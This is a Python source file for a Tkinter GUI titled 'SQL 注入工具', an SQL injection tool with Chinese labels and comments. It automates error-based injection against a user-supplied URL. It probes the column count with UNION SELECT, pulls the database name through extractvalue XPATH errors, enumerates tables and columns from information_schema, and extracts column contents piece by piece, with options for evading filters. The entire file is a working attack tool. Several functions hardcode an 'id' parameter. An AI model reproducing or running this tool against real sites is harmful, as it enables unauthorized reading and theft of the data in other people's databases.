import requests
import re
import tkinter as tk
from tkinter import messagebox, simpledialog, ttk

# 盲注
def test_column_count(base_url, query_param, injection_type, spacing_param, close_param):
    count = 0
    comma_payload = ''
    while True:
        payload = f"1{injection_type}union{spacing_param}select{spacing_param}1{comma_payload}{close_param}"
        url = f"{base_url}?{query_param}={payload}"
        
        response = requests.get(url)

        if response.status_code == 200:
            content = response.text
            
            if "The used SELECT statements have a different number of columns" in content:
                comma_payload += ',1'
                count += 1
            else:
                return count
        else:
            print(f"Request failed: {response.status_code}")
            break
    return 0

def fetch_database_names(base_url, query_param, count_payload, injection_type, spacing_param, close_param):
    payload1 = f"1{injection_type}union{spacing_param}select{spacing_param}{count_payload},extractvalue(1,concat(0x7e,database())){close_param}"
    url = f'{base_url}?{query_param}={payload1}'
    try:
        response = requests.get(url)

        if response.status_code == 200:
            response_text = response.text
            match = re.search(r"XPATH syntax error: '~(.*?)'", response_text)

            if match:
                return match.group(1)
            else:
                print('报错盲注失败')
        else:
            print(f'Request failed,状态码: {response.status_code}')

    except requests.exceptions.RequestException as e:
        print(f'Request failed: {e}')
    
    return None

def fetch_table_names(base_url, count_payload, injection_type, spacing_param, close_param):
    limit = 0
    results = []
    while True:
        payload2 = f"1{injection_type}union{spacing_param}select{spacing_param}{count_payload},extractvalue(1,concat(0x7e,(select{spacing_param}table_name{spacing_param}from{spacing_param}information_schema.tables{spacing_param}where{spacing_param}table_schema=database(){spacing_param}limit{spacing_param}{limit},1))){close_param}"
        url = f"{base_url}?id={payload2}"
        response = requests.get(url)

        if response.status_code == 200:
            content = response.text
            match = re.search(r"XPATH syntax error: '~(.*?)'", content)

            if match:
                table_name = match.group(1)
                results.append(table_name)
            else:
                break
            limit += 1
        else:
            print(f"Request failed: {response.status_code}")
            break

    return results

def fetch_column_names(base_url, table_name, count_payload, injection_type, spacing_param, close_param):
    limit = 0
    results = []
    while True:
        payload3 = f"1{injection_type}union{spacing_param}select{spacing_param}{count_payload},extractvalue(1,concat(0x7e,(select{spacing_param}column_name{spacing_param}from{spacing_param}information_schema.columns{spacing_param}where{spacing_param}table_schema=database(){spacing_param}and{spacing_param}table_name='{table_name}'{spacing_param}limit{spacing_param}{limit},1))){close_param}"
        url = f"{base_url}?id={payload3}"
        response = requests.get(url)

        if response.status_code == 200:
            content = response.text
            match = re.search(r"XPATH syntax error: '~(.*?)'", content)

            if match:
                column_name = match.group(1)
                results.append(column_name)
            else:
                break
            limit += 1
        else:
            print(f"Request failed: {response.status_code}")
            break

    return results

def fetch_column_data(base_url, table_name, column_name, count_payload, injection_type, spacing_param, close_param):
    results = []
    offset = 1
    length = 1

    while True:
        payload4 = f"1{injection_type}union{spacing_param}select{spacing_param}{count_payload},extractvalue(1,concat(0x7e,substring((select{spacing_param}group_concat({column_name}){spacing_param}from{spacing_param}{table_name}),{offset},{length}))){close_param}"
        url = f"{base_url}?id={payload4}"
        response = requests.get(url)

        if response.status_code == 200:
            content = response.text
            match = re.search(r"XPATH syntax error: '~(.*?)'", content)

            if match:
                data_value = match.group(1)
                if data_value:
                    results.append(data_value)
                else:
                    break
            else:
                break

            offset += length
        else:
            print(f"Request failed: {response.status_code}")
            break

    return ''.join(results)

def run_injection():
    base_url = url_entry.get()
    query_param = param_entry.get()
    injection_type = injection_entry.get()
    spacing_param = spacing_entry.get()
    close_param = close_entry.get()

    column_count = test_column_count(base_url, query_param, injection_type, spacing_param, close_param)
    result_text.delete(1.0, tk.END)  # 清空文本框
    result_text.insert(tk.END, f"检测到的列数: {column_count + 1}\n")
    
    count_payload = ','.join(['1' for _ in range(column_count)])
    if column_count > 0:
        database_name = fetch_database_names(base_url, query_param, count_payload, injection_type, spacing_param, close_param)
        if database_name:
            table_names = fetch_table_names(base_url, count_payload, injection_type, spacing_param, close_param)
            result_text.insert(tk.END, f'所有表名: {table_names}\n')
            
            # 清空下拉框
            table_combobox['values'] = table_names
            table_combobox.current(0)  # 默认选择第一个表

            # 获取列名
            column_names = fetch_column_names(base_url, table_names[0], count_payload, injection_type, spacing_param, close_param)
            result_text.insert(tk.END, f'{table_names[0]}的所有列名: {column_names}\n')
            column_combobox['values'] = column_names
            column_combobox.current(0)  # 默认选择第一个列

def fetch_data():
    selected_table = table_combobox.get()
    selected_column = column_combobox.get()
    
    base_url = url_entry.get()
    query_param = param_entry.get()
    injection_type = injection_entry.get()
    spacing_param = spacing_entry.get()
    close_param = close_entry.get()

    column_count = test_column_count(base_url, query_param, injection_type, spacing_param, close_param)
    count_payload = ','.join(['1' for _ in range(column_count)])

    column_data = fetch_column_data(base_url, selected_table, selected_column, count_payload, injection_type, spacing_param, close_param)
    result_text.insert(tk.END, f'{selected_table}.{selected_column} 的所有值: {column_data}\n')

# 创建主窗口
root = tk.Tk()
root.title("SQL 注入工具")

# 创建输入框
tk.Label(root, text="基础 URL:").grid(row=0, column=0)
url_entry = tk.Entry(root, width=50)
url_entry.grid(row=0, column=1)

tk.Label(root, text="查询参数:").grid(row=1, column=0)
param_entry = tk.Entry(root, width=50)
param_entry.grid(row=1, column=1)

tk.Label(root, text="注入类型:").grid(row=2, column=0)
injection_entry = tk.Entry(root, width=50)
injection_entry.grid(row=2, column=1)

tk.Label(root, text="代替空格的字符:").grid(row=3, column=0)
spacing_entry = tk.Entry(root, width=50)
spacing_entry.grid(row=3, column=1)

tk.Label(root, text="闭合符替换的字符:").grid(row=4, column=0)
close_entry = tk.Entry(root, width=50)
close_entry.grid(row=4, column=1)

# 创建运行按钮
run_button = tk.Button(root, text="运行注入", command=run_injection)
run_button.grid(row=5, column=0, columnspan=2)

# 创建表和列选择下拉框
tk.Label(root, text="选择表:").grid(row=6, column=0)
table_combobox = ttk.Combobox(root, width=48)
table_combobox.grid(row=6, column=1)

tk.Label(root, text="选择列:").grid(row=7, column=0)
column_combobox = ttk.Combobox(root, width=48)
column_combobox.grid(row=7, column=1)

# 创建获取数据按钮
fetch_button = tk.Button(root, text="获取数据", command=fetch_data)
fetch_button.grid(row=8, column=0, columnspan=2)

# 创建结果文本框
result_text = tk.Text(root, height=15, width=80)
result_text.grid(row=9, column=0, columnspan=2)

# 运行主循环
root.mainloop()
